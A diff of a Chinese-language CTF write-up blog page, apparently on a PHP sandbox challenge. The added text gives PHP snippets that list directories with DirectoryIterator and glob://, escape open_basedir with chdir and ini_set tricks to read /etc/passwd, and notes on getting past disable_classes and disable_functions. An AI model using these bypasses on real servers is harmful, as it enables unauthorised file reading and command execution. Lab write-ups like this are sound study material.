@@ -17,8 +17,11 @@
 <meta property="og:image" content="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png">
 <meta property="og:image" content="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png">
 <meta property="og:image" content="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png">
 <meta property="article:published_time" content="2021-04-29T07:51:45.000Z">
-<meta property="article:modified_time" content="2021-04-29T12:33:33.533Z">
+<meta property="article:modified_time" content="2021-04-30T04:59:35.014Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="Write Up">
 <meta name="twitter:card" content="summary">
@@ -184,7 +187,17 @@
 <p>好狠，之前 @LemonPrefect 师傅和👴说他觉得可以试试反射类：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>不过 <code>disable_class</code> 里面把能封的都封了，所以没办法，只能绕 df 了，害，不会了。</p>
+<p>不过 <code>disable_classes</code> 里面把能封的都封了，所以没办法，只能绕 df 了，害，不会了。</p>
+<p>可以通过 <code>DirectoryIterator</code> 列出目录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p>
+<p>有 <code>open_basedir</code>，绕一下可以读取一些基本文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p>
+<p>flag 读不了，参考了 <a target="_blank" rel="noopener" href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> 大佬的博客发现读取 <code>php.ini</code> 可以发现 so 文件，不过 BUU 里把这个预期解删掉了，但是还有别的方法可以做。</p>
+<p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p>
 
   </div>
 </article>
